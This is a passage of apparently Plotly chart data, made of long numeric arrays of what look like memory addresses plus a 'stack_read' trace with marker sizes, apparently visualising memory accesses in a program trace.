140224210382689, 140224210382676, 140224210382690, 140224210382680, 140224210382691, 140224210382684, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382690, 140224210382690, 140224210382673, 140224210382692, 140224210382690, 140224210382674, 140224210382690, 140224210382690, 140224210382690, 140224210382675, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382676, 140224210382690, 140224210382690, 140224210382690, 140224210382677, 140224210382692, 140224210382690, 140224210382678, 140224210382690, 140224210382690, 140224210382690, 140224210382679, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382680, 140224210382690, 140224210382690, 140224210382690, 140224210382681, 140224210382692, 140224210382690, 140224210382682, 140224210382690, 140224210382690, 140224210382690, 140224210382683, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382684, 140224210382690, 140224210382690, 140224210382690, 140224210382685, 140224210382692, 140224210382690, 140224210382686, 140224210382690, 140224210382690, 140224210382690, 140224210382687, 140224210382688, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 140224210382689, 140224210382676, 140224210382690, 140224210382680, 140224210382691, 140224210382684, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382690, 140224210382690, 140224210382673, 140224210382692, 140224210382690, 140224210382674, 140224210382690, 140224210382690, 140224210382690, 140224210382675, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382676, 140224210382690, 140224210382690, 140224210382690, 140224210382677, 140224210382692, 140224210382690, 140224210382678, 140224210382690, 140224210382690, 140224210382690, 140224210382679, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382680, 140224210382690, 140224210382690, 140224210382690, 140224210382681, 140224210382692, 140224210382690, 140224210382682, 140224210382690, 140224210382690, 140224210382690, 140224210382683, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382684, 140224210382690, 140224210382690, 140224210382690, 140224210382685, 140224210382692, 140224210382690, 140224210382686, 140224210382690, 140224210382690, 140224210382690, 140224210382687, 140224210382688, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 140224210382689, 140224210382676, 140224210382690, 140224210382680, 140224210382691, 140224210382684, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382690, 140224210382690, 140224210382673, 140224210382692, 140224210382690, 140224210382674, 140224210382690, 140224210382690, 140224210382690, 140224210382675, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382676, 140224210382690, 140224210382690, 140224210382690, 140224210382677, 140224210382692, 140224210382690, 140224210382678, 140224210382690, 140224210382690, 140224210382690, 140224210382679, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382680, 140224210382690, 140224210382690, 140224210382690, 140224210382681, 140224210382692, 140224210382690, 140224210382682, 140224210382690, 140224210382690, 140224210382690, 140224210382683, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382684, 140224210382690, 140224210382690, 140224210382690, 140224210382685, 140224210382692, 140224210382690, 140224210382686, 140224210382690, 140224210382690, 140224210382690, 140224210382687, 140224210382688, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 140224210382689, 140224210382676, 140224210382690, 140224210382680, 140224210382691, 140224210382684, 140224210382713, 140224210382712, 140224210382711, 140224210382710, 140224210382709, 140224210382708, 140224210382707, 140224210382706, 140224210382705, 140224210382704, 140224210382703, 140224210382702, 140224210382701, 140224210382700, 140224210382699, 140224210382698, 140224210382697, 140224210382696, 140224210382695, 140224210382694, 140224210382693, 140224210382691, 140224210382694, 140224210382692, 140224210382693, 140224210382697, 140224210382688, 140224210382689, 140224210382696, 140224210382691, 140224210382690, 140224210382672, 140224210382694, 140224210382695, 140224210382713, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382712, 140224210382673, 140224210382692, 140224210382693, 140224210382695, 140224210382690, 140224210382711, 140224210382674, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382675, 140224210382710, 140224210382691, 140224210382694, 140224210382692, 140224210382693, 140224210382697, 140224210382688, 140224210382689, 140224210382696, 140224210382691, 140224210382690, 140224210382676, 140224210382694, 140224210382695, 140224210382709, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382708, 140224210382677, 140224210382692, 140224210382693, 140224210382695, 140224210382690, 140224210382707, 140224210382678, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382679, 140224210382706, 140224210382691, 140224210382694, 140224210382692, 140224210382693, 140224210382697, 140224210382688, 140224210382689, 140224210382696, 140224210382691, 140224210382690, 140224210382680, 140224210382694, 140224210382695, 140224210382705, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382704, 140224210382681, 140224210382692, 140224210382693, 140224210382695, 140224210382690, 140224210382703, 140224210382682, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382683, 140224210382702, 140224210382691, 140224210382694, 140224210382692, 140224210382693, 140224210382697, 140224210382688, 140224210382689, 140224210382696, 140224210382691, 140224210382690, 140224210382684, 140224210382694, 140224210382695, 140224210382701, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382700, 140224210382685, 140224210382692, 140224210382693, 140224210382695, 140224210382690, 140224210382699, 140224210382686, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382687, 140224210382698, 140224210382688, 140224210382712, 140224210382697, 140224210382673, 140224210382677, 140224210382708, 140224210382704, 140224210382681, 140224210382700, 140224210382685, 140224210382688, 140224210382697, 140224210382711, 140224210382674, 140224210382682, 140224210382703, 140224210382697, 140224210382678, 140224210382688, 140224210382707, 140224210382699, 140224210382686, 140224210382697, 140224210382688, 140224210382675, 140224210382710, 140224210382687, 140224210382698, 140224210382683, 140224210382702, 140224210382706, 140224210382679, 140224210382688, 140224210382697, 140224210382713, 140224210382672, 140224210382689, 140224210382696, 140224210382709, 140224210382676, 140224210382690, 140224210382695, 140224210382705, 140224210382680, 140224210382691, 140224210382694, 140224210382701, 140224210382684, 140224210382691, 140224210382694, 140224210382692, 140224210382693, 140224210382697, 140224210382688, 140224210382689, 140224210382696, 140224210382691, 140224210382690, 140224210382672, 140224210382694, 140224210382695, 140224210382713, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382712, 140224210382673, 140224210382692, 140224210382693, 140224210382695, 140224210382690, 140224210382711, 140224210382674, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382675, 140224210382710, 140224210382691, 140224210382694, 140224210382692, 140224210382693, 140224210382697, 140224210382688, 140224210382689, 140224210382696, 140224210382691, 140224210382690, 140224210382676, 140224210382694, 140224210382695, 140224210382709, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382708, 140224210382677, 140224210382692, 140224210382693, 140224210382695, 140224210382690, 140224210382707, 140224210382678, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382679, 140224210382706, 140224210382691, 140224210382694, 140224210382692, 140224210382693, 140224210382697, 140224210382688, 140224210382689, 140224210382696, 140224210382691, 140224210382690, 140224210382680, 140224210382694, 140224210382695, 140224210382705, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382704, 140224210382681, 140224210382692, 140224210382693, 140224210382695, 140224210382690, 140224210382703, 140224210382682, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382683, 140224210382702, 140224210382691, 140224210382694, 140224210382692, 140224210382693, 140224210382697, 140224210382688, 140224210382689, 140224210382696, 140224210382691, 140224210382690, 140224210382684, 140224210382694, 140224210382695, 140224210382701, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382700, 140224210382685, 140224210382692, 140224210382693, 140224210382695, 140224210382690, 140224210382699, 140224210382686, 140224210382690, 140224210382695, 140224210382695, 140224210382690, 140224210382690, 140224210382695, 140224210382687, 140224210382698, 140224210382688, 140224210382712, 140224210382697, 140224210382673, 140224210382677, 140224210382708, 140224210382704, 140224210382681, 140224210382700, 140224210382685, 140224210382688, 140224210382697, 140224210382711, 140224210382674, 140224210382682, 140224210382703, 140224210382697, 140224210382678, 140224210382688, 140224210382707, 140224210382699, 140224210382686, 140224210382697, 140224210382688, 140224210382675, 140224210382710, 140224210382687, 140224210382698, 140224210382683, 140224210382702, 140224210382706, 140224210382679, 140224210382688, 140224210382697, 140224210382713, 140224210382672, 140224210382689, 140224210382696, 140224210382709, 140224210382676, 140224210382690, 140224210382695, 140224210382705, 140224210382680, 140224210382691, 140224210382694, 140224210382701, 140224210382684, 140224210382713, 140224210382713, 140224210382672, 140224210382672, 140224210382713, 140224210382672, 140224210382712, 140224210382712, 140224210382673, 140224210382673, 140224210382712, 140224210382673, 140224210382711, 140224210382711, 140224210382674, 140224210382674, 140224210382711, 140224210382674, 140224210382710, 140224210382710, 140224210382675, 140224210382675, 140224210382710, 140224210382675, 140224210382709, 140224210382709, 140224210382676, 140224210382676, 140224210382709, 140224210382676, 140224210382708, 140224210382708, 140224210382677, 140224210382677, 140224210382708, 140224210382677, 140224210382707, 140224210382707, 140224210382678, 140224210382678, 140224210382707, 140224210382678, 140224210382706, 140224210382706, 140224210382679, 140224210382679, 140224210382706, 140224210382679, 140224210382705, 140224210382705, 140224210382680, 140224210382680, 140224210382705, 140224210382680, 140224210382704, 140224210382704, 140224210382681, 140224210382681, 140224210382704, 140224210382681, 140224210382703, 140224210382703, 140224210382682, 140224210382682, 140224210382703, 140224210382682, 140224210382702, 140224210382702, 140224210382683, 140224210382683, 140224210382702, 140224210382683, 140224210382701, 140224210382701, 140224210382684, 140224210382684, 140224210382701, 140224210382684, 140224210382700, 140224210382700, 140224210382685, 140224210382685, 140224210382700, 140224210382685, 140224210382699, 140224210382699, 140224210382686, 140224210382686, 140224210382699, 140224210382686, 140224210382698, 140224210382698, 140224210382687, 140224210382687, 140224210382698, 140224210382687, 140224210382672, 140224210382673, 140224210382674, 140224210382675, 140224210382676, 140224210382677, 140224210382678, 140224210382679, 140224210382680, 140224210382681, 140224210382682, 140224210382683, 140224210382684, 140224210382685, 140224210382686, 140224210382687], \"yaxis\": \"y\"}, {\"hoverlabel\": {\"namelength\": 0}, \"hovertemplate\": \"type=stack_read<br>id=%{x}<br>access=%{y}<br>size=%{marker.size}\", \"legendgroup\": \"stack_read\", \"marker\": {\"color\": \"#EF553B\", \"size\": [8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 